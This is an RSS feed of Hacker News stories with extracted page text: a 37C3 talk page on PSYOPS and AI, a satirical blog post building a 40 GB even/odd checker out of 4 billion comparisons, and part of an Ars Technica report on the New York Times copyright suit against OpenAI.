<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Thu, 28 Dec 2023 12:00:05 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[You've just been fucked by psyops [video] (162 pts)]]></title>
            <link>https://media.ccc.de/v/37c3-12326-you_ve_just_been_fucked_by_psyops</link>
            <guid>38791575</guid>
            <pubDate>Thu, 28 Dec 2023 09:17:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://media.ccc.de/v/37c3-12326-you_ve_just_been_fucked_by_psyops">https://media.ccc.de/v/37c3-12326-you_ve_just_been_fucked_by_psyops</a>, See on <a href="https://news.ycombinator.com/item?id=38791575">Hacker News</a></p>
<div id="readability-page-1" class="page">

<div>
<ol>
<li>
<a href="https://media.ccc.de/b">
browse
</a>
</li>
<li>
<span></span>
<a href="https://media.ccc.de/b/congress">
congress
</a>
</li>
<li>
<span></span>
<a href="https://media.ccc.de/b/congress/2023">
2023
</a>
</li>
<li>
<span></span>
event
</li>
</ol>
</div>

<div>

<p>
<span></span>
<a href="https://media.ccc.de/search?p=Trevor+Paglen">Trevor Paglen</a>

</p>

<p><a href="https://media.ccc.de/c/37c3/" rel="tag"></a>
<a href="https://media.ccc.de/c/37c3/Art%20&amp;%20Beauty" rel="tag">Art &amp; Beauty</a>
Playlists:
<a href="https://media.ccc.de/v/37c3-12326-you_ve_just_been_fucked_by_psyops/playlist">'37c3' videos starting here</a>
/
<a data-method="get" href="https://media.ccc.de/v/37c3-12326-you_ve_just_been_fucked_by_psyops/audio">audio</a></p>
<!-- %h3 About -->
<p>How the history of military and government PSYOPS involving mind-control, UFOs, magic, and remote-control zombies, explains the future of AI and generative media. Along the way, talk attendees will be given an enrollment code to join a specialized CTF/ARG game called CYCLOPS that explores these themes and that will run the duration of Congress. </p>

<p>As AI-generated content, social-media influence operations, micro-targeted advertising, and ubiquitous surveillance have become the norm on the Internet and in the market in general, we have entered an era of PSYOP Capitalism. This is an era of hallucinations designed to transform each of us into a “targeted individual” through the manipulation of perception. This talk explores a secret history of reality-altering military and intelligence programs that serve as antecedents to a phantasmagoric present.</p>

<p>At the talk, attendees will be given a registration code to play “CYCLOPS,” a CTF/ARG game that will run the duration of Congress. CYCLOPS explores the themes of the mind-control and PSYOPS through an interactive parafictional narrative taking place in the context of an obscure CIA cognitive warfare program from the early days of the Cold War.
</p>

<h3>Download</h3>
<div>

<div>
<h4>These files contain multiple languages.</h4>
<p>
This Talk was translated into multiple languages. The files available
for download contain all languages as separate audio-tracks. Most
desktop video players allow you to choose between them.
</p>
<p>
Please look for "audio tracks" in your desktop video player.
</p>
</div>
<div>
<p>
<h4>Subtitles</h4>
</p>

</div>
<div>
<p>
<h4>Audio</h4>
</p>

</div>
</div>
<!-- %h3 Embed/Share -->

<h3>Tags</h3>

</div>





</div>]]></description>
        </item>
        <item>
            <title><![CDATA[4B If Statements (492 pts)]]></title>
            <link>https://andreasjhkarlsson.github.io//jekyll/update/2023/12/27/4-billion-if-statements.html</link>
            <guid>38790597</guid>
            <pubDate>Thu, 28 Dec 2023 06:11:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://andreasjhkarlsson.github.io//jekyll/update/2023/12/27/4-billion-if-statements.html">https://andreasjhkarlsson.github.io//jekyll/update/2023/12/27/4-billion-if-statements.html</a>, See on <a href="https://news.ycombinator.com/item?id=38790597">Hacker News</a></p>
<div id="readability-page-1" class="page"><div aria-label="Content">
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>I recently stumbled upon this screenshot while researching social media on the train. Of course, it was followed by a cascade of spiteful comments, criticizing this fresh programmer’s attempt to solve a classical problem in computer science. The modulus operation.</p>

<p><img src="https://andreasjhkarlsson.github.io/assets/images/GCPVDa1WYAAoBut.jpg" alt="TikTok screenshot" width="250"></p>

<p>Now, in a world where AI is replacing programmers by the minute, taking their jobs and revolutionizing the way we think about code, maybe we should be more open to the thoughts of the fresh new blood of the industry? In fact, the above code is a perfect example of a time-memory tradeoff. You’re trading off your time and at the same time, the computers memory and time as well! Truly a marvelous algorithm!</p>

<p>So I went to work to explore this idea of checking if a number is odd or even by only using comparisons to see how well it works in a real world scenario. Since I’m a great believer in performant code I decided to implement this in the C programming language as it’s by far the fastest language on the planet to this day (thanks to the visionary genius Dennis Richie).</p>

<p>So I started composing</p>

<figure><pre><code data-lang="c"><span>/* Copyright 2023. All unauthorized distribution of this source code 
   will be persecuted to the fullest extent of the law*/</span>
<span>#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;
</span><span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span><span>*</span> <span>argv</span><span>[])</span>
<span>{</span>
    <span>uint8_t</span> <span>number</span> <span>=</span> <span>atoi</span><span>(</span><span>argv</span><span>[</span><span>1</span><span>]);</span> <span>// No problems here</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>0</span><span>)</span>
        <span>printf</span><span>(</span><span>"even</span><span>\n</span><span>"</span><span>);</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>1</span><span>)</span>
        <span>printf</span><span>(</span><span>"odd</span><span>\n</span><span>"</span><span>);</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>2</span><span>)</span>
        <span>printf</span><span>(</span><span>"even</span><span>\n</span><span>"</span><span>);</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>3</span><span>)</span>
        <span>printf</span><span>(</span><span>"odd</span><span>\n</span><span>"</span><span>);</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>4</span><span>)</span>
        <span>printf</span><span>(</span><span>"even</span><span>\n</span><span>"</span><span>);</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>5</span><span>)</span>
        <span>printf</span><span>(</span><span>"odd</span><span>\n</span><span>"</span><span>);</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>6</span><span>)</span>
        <span>printf</span><span>(</span><span>"even</span><span>\n</span><span>"</span><span>);</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>7</span><span>)</span>
        <span>printf</span><span>(</span><span>"odd</span><span>\n</span><span>"</span><span>);</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>8</span><span>)</span>
        <span>printf</span><span>(</span><span>"even</span><span>\n</span><span>"</span><span>);</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>9</span><span>)</span>
        <span>printf</span><span>(</span><span>"odd</span><span>\n</span><span>"</span><span>);</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>10</span><span>)</span>
        <span>printf</span><span>(</span><span>"even</span><span>\n</span><span>"</span><span>);</span>
<span>}</span></code></pre></figure>

<p>Beautiful! Lets compile the code, disabling optimizations with /Od to make sure that the pesky compiler doesn’t interfere with our algorithm. After compiling we can do a quick test of the program we get some positive results:</p>

<figure><pre><code data-lang="powershell"><span>PS</span><span> </span><span>&gt;</span><span> </span><span>cl.exe</span><span> </span><span>/Od</span><span> </span><span>program.c</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>0</span><span> 
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>4</span><span>
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>3</span><span>
</span><span>odd</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>7</span><span>
</span><span>odd</span></code></pre></figure>

<p>However, after doing some further testing I found some problems:</p>

<figure><pre><code data-lang="powershell"><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>50</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>11</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>99</span></code></pre></figure>

<p>No output! It seems that the program only works for numbers under 11! Going back to the code we can find the issue right after the last if statement, we need more if statements!</p>

<p>Now, this is a time-memory tradeoff, but my time on this earth is limited so I decided to meta-program the if statements using a programmer program in a different programming language. To compensate for this cheating I decided to use the slowest language on the planet, Python (thanks to the visionary genius of Ross van der Gussom).</p>

<figure><pre><code data-lang="python"><span>print</span><span>(</span><span>"/* Copyright 2023. All unauthorized distribution of this source code"</span><span>)</span>
<span>print</span><span>(</span><span>"   will be persecuted to the fullest extent of the law*/"</span><span>)</span>

<span>print</span><span>(</span><span>"#include &lt;stdio.h&gt;"</span><span>)</span>
<span>print</span><span>(</span><span>"#include &lt;stdint.h&gt;"</span><span>)</span>
<span>print</span><span>(</span><span>"#include &lt;stdlib.h&gt;"</span><span>)</span>

<span>print</span><span>(</span><span>"int main(int argc, char* argv[])"</span><span>)</span>
<span>print</span><span>(</span><span>"{"</span><span>)</span>
<span>print</span><span>(</span><span>"    uint8_t number = atoi(argv[1]); // No problems here"</span><span>)</span>

<span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>2</span><span>**</span><span>8</span><span>):</span>
    <span>print</span><span>(</span><span>"    if (number == "</span><span>+</span><span>str</span><span>(</span><span>i</span><span>)</span><span>+</span><span>")"</span><span>)</span>
    <span>if</span> <span>i</span> <span>%</span> <span>2</span> <span>==</span> <span>0</span><span>:</span>
        <span>print</span><span>(</span><span>"        printf(</span><span>\"</span><span>even</span><span>\\</span><span>n</span><span>\"</span><span>);"</span><span>)</span>
    <span>else</span><span>:</span>
        <span>print</span><span>(</span><span>"        printf(</span><span>\"</span><span>odd</span><span>\\</span><span>n</span><span>\"</span><span>);"</span><span>)</span>

<span>print</span><span>(</span><span>"}"</span><span>)</span></code></pre></figure>

<p>Nice! Now we can generate a program that solves the even-odd problem for all 8-bit integers!</p>

<figure><pre><code data-lang="powershell"><span>PS</span><span> </span><span>&gt;</span><span> </span><span>python</span><span> </span><span>programmer.py</span><span> </span><span>&gt;</span><span> </span><span>program.c</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>cl.exe</span><span> </span><span>/Od</span><span> </span><span>program.c</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>99</span><span>
</span><span>odd</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>50</span><span>
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>240</span><span>
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>241</span><span>
</span><span>odd</span></code></pre></figure>

<p>Would you look at that! It works flawlessly! Now, let’s scale it up to 16 bit!</p>

<figure><pre><code data-lang="python"><span>print</span><span>(</span><span>"    uint16_t number = atoi(argv[1]); // No problems here"</span><span>)</span>
<span>…</span>
<span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>2</span><span>**</span><span>16</span><span>):</span></code></pre></figure>

<p>This gives a nice and thick c file of around 130k lines. Nothing really when looking back at some of the code bases I’ve worked on over the years. Let’s compile!</p>

<figure><pre><code data-lang="powershell"><span>PS</span><span> </span><span>&gt;</span><span> </span><span>python</span><span> </span><span>programmer.py</span><span> </span><span>&gt;</span><span> </span><span>program.c</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>cl.exe</span><span> </span><span>/Od</span><span> </span><span>program.c</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>21000</span><span>
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>3475</span><span> 
</span><span>odd</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>3</span><span>   
</span><span>odd</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>65001</span><span>
</span><span>odd</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>65532</span><span>
</span><span>even</span></code></pre></figure>

<p>Beautiful! Our algorithm seems to scale with the data! The executable is around 2 MB, but that’s no match for my beefy gaming rig with a whopping 31.8 GB of memory.</p>

<p>Now, 16 bit is a very cool bitwidth, but as we all know, 32 bit is the holy grail of computing and is the final bitwidth that we need to solve all practical engineering and scientific problems. After all, IPv4 is still standing stronger than ever, 60 years after it was deemed deprecated due to so called <a href="https://en.wikipedia.org/wiki/IPv4_address_exhaustion">“address exhaustion”</a>.</p>

<p>So without further ado, lets scale to our final size. 32 bit is only 65536 times as many numbers as 16 bit, what could go wrong?</p>

<figure><pre><code data-lang="python"><span>print</span><span>(</span><span>"    uint32_t number = atoi(argv[1]); // No problems here"</span><span>)</span>
<span>…</span>
<span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>2</span><span>**</span><span>32</span><span>):</span></code></pre></figure>

<p>So I let the mighty snake do its work and after getting a cup of coffee and getting back to check on the program 48 hours later I was left with a beautiful c file, almost 330 GB in size! Almost certainly among the largest c files in history. My fingers were trembling when I entered the next command, surely MSVC had never before encountered such powerful source code. After abusing the pagefile of my poor, powerful computer for half an hour the following was spat out:</p>

<figure><pre><code data-lang="powershell"><span>PS</span><span> </span><span>&gt;</span><span> </span><span>cl</span><span> </span><span>/Od</span><span> </span><span>program.c</span><span>
</span><span>Microsoft</span><span> </span><span>(</span><span>R</span><span>)</span><span> </span><span>C/C</span><span>++</span><span> </span><span>Optimizing</span><span> </span><span>Compiler</span><span> </span><span>Version</span><span> </span><span>19.32.31329</span><span> </span><span>for</span><span> </span><span>x64</span><span>
</span><span>Copyright</span><span> </span><span>(</span><span>C</span><span>)</span><span> </span><span>Microsoft</span><span> </span><span>Corporation.</span><span>  </span><span>All</span><span> </span><span>rights</span><span> </span><span>reserved.</span><span>

</span><span>program.c</span><span>
</span><span>program.c</span><span>(</span><span>134397076</span><span>):</span><span> </span><span>warning</span><span> </span><span>C4049:</span><span> </span><span>compiler</span><span> </span><span>limit:</span><span> </span><span>terminating</span><span> </span><span>line</span><span> </span><span>number</span><span> </span><span>emission</span><span>
</span><span>program.c</span><span>(</span><span>134397076</span><span>):</span><span> </span><span>note:</span><span> </span><span>Compiler</span><span> </span><span>limit</span><span> </span><span>for</span><span> </span><span>line</span><span> </span><span>number</span><span> </span><span>is</span><span> </span><span>16777215</span><span>
</span><span>program.c</span><span>(</span><span>41133672</span><span>):</span><span> </span><span>fatal</span><span> </span><span>error</span><span> </span><span>C1060:</span><span> </span><span>compiler</span><span> </span><span>is</span><span> </span><span>out</span><span> </span><span>of</span><span> </span><span>heap</span><span> </span><span>space</span></code></pre></figure>

<p>Pathetic!</p>

<p>And not only did the compiler fail us, but when looking into the limits of the Portable Executable format (.exe) for windows, I discovered that it cannot handle more than a <a href="https://stackoverflow.com/questions/6976693/what-is-the-maximum-size-of-a-pe-file-on-64-bit-windows">measly 4 GB</a>! With more than 4 billion comparisons needed to be encoded into the executable, this is a major obstacle for implementing our algorithm. Even if each comparison would use less than a single byte we would still be too heavy.</p>

<p>However, bad compilers and file formats should not stop us from achieving our dream. After all, all what a compiler does is writing some fancy machine code into a file and the file format is just some structure telling the OS how to put the binary code into memory. Really, we can do that ourselves.</p>

<p>Let’s start by writing an IsEven function in <a href="https://en.wikipedia.org/wiki/X86_assembly_language">x86-64 assembly</a> as it’s the native language of my Intel powered machine. It looks something like this:</p>

<figure><pre><code data-lang="assembly">; Argument is stored in ECX, return value in EAX
XOR EAX, EAX ; Set eax to zero (return value for odd number)
CMP ECX, 0h ; Compare arg to 0 
JNE 3h ; Skip next two instructions if it wasn't equal
INC EAX ; It was even, set even return value (1)
RET ; Return
CMP ECX, 1h ; Compare arg to 1
JNE 2 ; Skip next instruction if not equal
RET ; Odd return value already in EAX, just RET
; add the next 2...2^32-1 comparisons here
RET ; Fallback return</code></pre></figure>

<p>Not really correct asm, but it doesn’t matter much, because we’re gonna compile it into machine code manually.</p>

<p>How did I do this? Well I jumped online, using a mix of my early life experience coding emulators and hacking and looked into the x86(-64) architecture manuals to figure out the correct opcodes and format for each instruction.</p>

<p>… Just kidding, that’s horrible. I asked ChatGPT what the correct <a href="https://en.wikipedia.org/wiki/Opcode">opcode</a> was for each instruction and lucky for us it didn’t hallucinate any new extensions to x86-64.</p>

<p>So now we just write a “compiler” to output this code. Note that we will write the opcodes we got from the AI for the instructions directly. Here’s how it looks in our friend python:</p>

<figure><pre><code data-lang="python"><span>import</span> <span>struct</span>

<span>with</span> <span>open</span><span>(</span><span>'isEven.bin'</span><span>,</span> <span>'wb'</span><span>)</span> <span>as</span> <span>file</span><span>:</span>
   
    <span>file</span><span>.</span><span>write</span><span>(</span><span>b</span><span>"</span><span>\x31\xC0</span><span>"</span><span>)</span>                     <span># XOR EAX, EAX
</span>
    <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>2</span><span>**</span><span>32</span><span>):</span>
        <span>ib</span> <span>=</span> <span>struct</span><span>.</span><span>pack</span><span>(</span><span>"&lt;I"</span><span>,</span> <span>i</span><span>)</span>               <span># Encode i as 32 bit little endian integer
</span>
        <span>file</span><span>.</span><span>write</span><span>(</span><span>b</span><span>"</span><span>\x81\xF9</span><span>"</span> <span>+</span> <span>ib</span><span>)</span>            <span># CMP ECX, i
</span>
        <span>if</span> <span>i</span><span>%</span><span>2</span> <span>==</span> <span>0</span><span>:</span>
            <span>file</span><span>.</span><span>write</span><span>(</span><span>b</span><span>"</span><span>\x75\x03</span><span>"</span><span>)</span>             <span># JNE +3
</span>            <span>file</span><span>.</span><span>write</span><span>(</span><span>b</span><span>"</span><span>\xFF\xC0</span><span>"</span><span>)</span>             <span># INC EAX
</span>            <span>file</span><span>.</span><span>write</span><span>(</span><span>b</span><span>"</span><span>\xC3</span><span>"</span><span>)</span>                 <span># RET
</span>        <span>else</span><span>:</span>
            <span>file</span><span>.</span><span>write</span><span>(</span><span>b</span><span>"</span><span>\x75\x01</span><span>"</span><span>)</span>             <span># JNE +1
</span>            <span>file</span><span>.</span><span>write</span><span>(</span><span>b</span><span>"</span><span>\xC3</span><span>"</span><span>)</span>                 <span># RET
</span>
    <span>file</span><span>.</span><span>write</span><span>(</span><span>b</span><span>"</span><span>\xC3</span><span>"</span><span>)</span>                         <span># Fallback RET</span></code></pre></figure>

<p>While we somewhat deviated from the original vision of the TikTok post, the essence remains the same. We create a long, long, long list of if-statements to determine if any number is even or odd, ignoring any arithmetic operation that would help out.</p>

<p>Running this gives us a nice 40 GB file which contains all 4.2 billion comparisons needed to determine if any 32 bit number is even or odd! Now we just need to write our host program that can load and use these instructions. For added performance (it is very important), I decided to map the file into the address space instead of reading all of it. By doing this, we can just pretend that the entire file is already in memory and let the poor OS deal with fitting a 40 GB blob into virtual memory. After mapping the file with READ and EXECUTE permissions we can call into the code by using a function pointer. It looks like this:</p>

<figure><pre><code data-lang="c"><span>#include &lt;stdio.h&gt;
#include &lt;Windows.h&gt;
#include &lt;stdint.h&gt;
</span>
<span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span><span>*</span> <span>argv</span><span>[])</span>
<span>{</span>
    <span>uint32_t</span> <span>number</span> <span>=</span> <span>atoi</span><span>(</span><span>argv</span><span>[</span><span>1</span><span>]);</span> <span>// No problems here</span>

    <span>// Open code file</span>
    <span>HANDLE</span> <span>binFile</span> <span>=</span> <span>CreateFileA</span><span>(</span>
                        <span>"isEven.bin"</span><span>,</span>
                        <span>GENERIC_READ</span> <span>|</span> <span>GENERIC_EXECUTE</span><span>,</span> <span>FILE_SHARE_READ</span><span>,</span>
                        <span>NULL</span><span>,</span>
                        <span>OPEN_EXISTING</span><span>,</span>
                        <span>FILE_ATTRIBUTE_NORMAL</span><span>,</span>
                        <span>NULL</span><span>);</span>
   
    <span>// Get 64 bit size of file</span>
    <span>LARGE_INTEGER</span> <span>codeSize</span><span>;</span>
    <span>GetFileSizeEx</span><span>(</span><span>binFile</span><span>,</span> <span>&amp;</span><span>codeSize</span><span>);</span>

    <span>// Create memory map of the file</span>
    <span>HANDLE</span> <span>mapping</span> <span>=</span> <span>CreateFileMapping</span><span>(</span>
                        <span>binFile</span><span>,</span>
                        <span>NULL</span><span>,</span>
                        <span>PAGE_EXECUTE_READ</span><span>,</span>
                        <span>0</span><span>,</span>
                        <span>0</span><span>,</span>
                        <span>NULL</span><span>);</span>

    <span>// Get a pointer to the code</span>
    <span>LPVOID</span> <span>code</span> <span>=</span> <span>MapViewOfFile</span><span>(</span>
                    <span>mapping</span><span>,</span><span>FILE_MAP_EXECUTE</span> <span>|</span> <span>FILE_MAP_READ</span><span>,</span>
                    <span>0</span><span>,</span>
                    <span>0</span><span>,</span>
                    <span>codeSize</span><span>.</span><span>QuadPart</span><span>);</span>

    <span>// Create a function that points to the code</span>
    <span>int</span> <span>(</span><span>*</span><span>isEven</span><span>)(</span><span>int</span><span>)</span> <span>=</span> <span>(</span><span>int</span><span>(</span><span>*</span><span>)(</span><span>int</span><span>))</span><span>code</span><span>;</span>

    <span>if</span> <span>(</span><span>isEven</span><span>(</span><span>number</span><span>))</span>
        <span>printf</span><span>(</span><span>"even</span><span>\n</span><span>"</span><span>);</span>
    <span>else</span>
        <span>printf</span><span>(</span><span>"odd</span><span>\n</span><span>"</span><span>);</span>

    <span>CloseHandle</span><span>(</span><span>binFile</span><span>);</span>
<span>}</span></code></pre></figure>

<p>And there we go! We now have everything to check if any 32 bit number is even or odd. Let’s take it for a spin:</p>

<figure><pre><code data-lang="powershell"><span>PS</span><span> </span><span>&gt;</span><span>.</span><span>\program.exe</span><span> </span><span>300</span><span>
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span>.</span><span>\program.exe</span><span> </span><span>0</span><span>
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span>.</span><span>\program.exe</span><span> </span><span>1000000</span><span>
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span>.</span><span>\program.exe</span><span> </span><span>100000007</span><span>
</span><span>odd</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span>.</span><span>\program.exe</span><span> </span><span>400000000</span><span>
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span>.</span><span>\program.exe</span><span> </span><span>400000001</span><span>
</span><span>odd</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span>.</span><span>\program.exe</span><span> </span><span>400000006</span><span>
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span>.</span><span>\program.exe</span><span> </span><span>4200000000</span><span>
</span><span>odd</span><span> </span><span>&lt;</span><span>----</span><span> </span><span>WRONG</span><span>!</span></code></pre></figure>

<p>Almost! Seems like the algorithm has some issues with signedness, any value over 2^31 seems to give random results. Sad!</p>

<p>Let’s fix the final bug.</p>

<p>It turns out that atoi cannot deal with unsigned pureness, so it failed to parse our big boy numbers. Replacing it with strtoul fixes everything.</p>

<figure><pre><code data-lang="c"><span>uint32_t</span> <span>number</span> <span>=</span> <span>strtoul</span><span>(</span><span>argv</span><span>[</span><span>1</span><span>],</span> <span>NULL</span><span>,</span> <span>10</span><span>);</span><span>// No problems here</span></code></pre></figure>

<figure><pre><code data-lang="powershell"><span>PS</span><span> </span><span>&gt;</span><span>.</span><span>\program.exe</span><span> </span><span>4200000000</span><span>
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span>.</span><span>\program.exe</span><span> </span><span>4200000001</span><span>
</span><span>odd</span></code></pre></figure>

<p>As a side note, the program is amazingly performant. For small numbers the results are instantaneous and for the large number close to the 2^32 limit the result is still returned in around 10 seconds. Considering the computer has to read 40 GB of data from disk, map it to physical memory and then let the CPU has a rip of it without many chances of caching is honestly quite mind blowing. For reference, the computer is a Core i5 12600K with 32 GB memory and the files are residing on a M.2 SSD disk. While calculating, the peak read speed I saw from the SSD was around 800 MB/s (which doesn’t really make sense as that should give execution speeds at 40+ seconds, but computers are magical so who knows what is going on).</p>

<p>And there we have it! The Internet proven wrong once again, not only can you actually write a fully functioning and performant program in the manner of the TikTok post, but it’s also very fun.</p>

  </div>
</article>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[NY Times copyright suit wants OpenAI to delete all GPT instances (191 pts)]]></title>
            <link>https://arstechnica.com/tech-policy/2023/12/ny-times-sues-open-ai-microsoft-over-copyright-infringement/</link>
            <guid>38790255</guid>
            <pubDate>Thu, 28 Dec 2023 05:07:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/tech-policy/2023/12/ny-times-sues-open-ai-microsoft-over-copyright-infringement/">https://arstechnica.com/tech-policy/2023/12/ny-times-sues-open-ai-microsoft-over-copyright-infringement/</a>, See on <a href="https://news.ycombinator.com/item?id=38790255">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <h4>
      Not the sincerest form of flattery    —
</h4>
            <h2 itemprop="headline">NY Times copyright suit wants OpenAI to delete all GPT instances</h2>
            <h2 itemprop="description">Shows evidence that GPT-based systems will reproduce Times articles if asked.</h2>
                    </div><div itemprop="articleBody">
                                    
<figure>
  <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/12/GettyImages-1621976654-800x450.jpg" alt="Image of a CPU on a motherboard with " ai="" stamped="" on="" it="">
      <figcaption><p><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/12/GettyImages-1621976654.jpg" data-height="1299" data-width="2309">Enlarge</a> <span>/</span> Microsoft is named in the suit for allegedly building the system that allowed GPT derivatives to be trained using infringing material.</p></figcaption>  </figure>

  




<!-- cache hit 339:single/related:c68a8bff5724c49da7e49cf4e16a54d5 --><!-- empty -->
<p>In August, <a href="https://arstechnica.com/tech-policy/2023/08/report-potential-nyt-lawsuit-could-force-openai-to-wipe-chatgpt-and-start-over/">word leaked out</a> that The New York Times was considering joining the growing legion of creators that are suing AI companies for misappropriating their content. The Times had reportedly been negotiating with OpenAI regarding the potential to license its material, but those talks had not gone smoothly. So, eight months after the company was reportedly considering suing, <a href="https://nytco-assets.nytimes.com/2023/12/NYT_Complaint_Dec2023.pdf">the suit has now been filed</a>.</p>
<p>The Times is targeting various companies under the OpenAI umbrella, as well as Microsoft, an OpenAI partner that both uses it to power its Copilot service and helped provide the infrastructure for training the GPT Large Language Model. But the suit goes well beyond the use of copyrighted material in training, alleging that OpenAI-powered software will happily circumvent the Times' paywall and ascribe hallucinated misinformation to the Times.</p>
<h2>Journalism is expensive</h2>
<p>The suit notes that The Times maintains a large staff that allows it to do things like dedicate reporters to a huge range of beats and engage in important investigative journalism, among other things. Because of those investments, the newspaper is often considered an authoritative source on many matters.</p>
<p>All of that costs money, and The Times earns that by limiting access to its reporting through a robust paywall. In addition, each print edition has a copyright notification, the Times' terms of service limit the copying and use of any published material, and it can be selective about how it licenses its stories. In addition to driving revenue, these restrictions also help it to maintain its reputation as an authoritative voice by controlling how its works appear.</p>
<p>The suit alleges that OpenAI-developed tools undermine all of that. "By providing Times content without The Times’s permission or authorization, Defendants’ tools undermine and damage The Times’s relationship with its readers and deprive The Times of subscription, licensing, advertising, and affiliate revenue," the suit alleges.</p>
<p>Part of the unauthorized use The Times alleges came during the training of various versions of GPT. Prior to GPT-3.5, information about the training dataset was made public. One of the sources used is a large collection of online material called "Common Crawl," which the suit alleges contains information from 16 million unique records from sites published by The Times. That places the Times as the third most referenced source, behind Wikipedia and a database of US patents.</p>                                            
                                                        
<p>OpenAI no longer discloses as many details of the data used for training of recent GPT versions, but all indications are that full-text NY Times articles are still part of that process (Much more on that in a moment.) Expect access to training information to be a major issue during discovery if this case moves forward.</p>
<h2>Not just training</h2>
<p>A <a href="https://arstechnica.com/tech-policy/2023/10/two-artists-suing-ai-image-makers-never-copyrighted-their-works/">number of suits</a> have <a href="https://arstechnica.com/tech-policy/2023/10/universal-music-sues-ai-start-up-anthropic-for-scraping-song-lyrics/">been filed</a> regarding the <a href="https://arstechnica.com/information-technology/2023/07/book-authors-sue-openai-and-meta-over-text-used-to-train-ai/">use of copyrighted material</a> during <a href="https://arstechnica.com/tech-policy/2023/09/george-r-r-martin-joins-authors-suing-openai-over-copyright-infringement/">training of AI systems</a>. But the Times' suit goes well beyond that to show how the material ingested during training can come back out during use. "Defendants’ GenAI tools can generate output that recites Times content verbatim, closely summarizes it, and mimics its expressive style, as demonstrated by scores of examples," the suit alleges.</p>
<p>The suit alleges—and we were able to verify—that it's comically easy to get GPT-powered systems to offer up content that is normally protected by the Times' paywall. The suit shows a number of examples of GPT-4 reproducing large sections of articles nearly verbatim.</p>
<p>The suit includes screenshots of ChatGPT being given the title of a piece at The New York Times and asked for the first paragraph, which it delivers. Getting the ensuing text is apparently as simple as repeatedly asking for the next paragraph.</p>
<p>ChatGPT has apparently closed that loophole in between the preparation of that suit and the present. We entered some of the prompts shown in the suit, and were advised "I recommend checking The New York Times website or other reputable sources," although we can't rule out that context provided prior to that prompt could produce copyrighted material.</p>
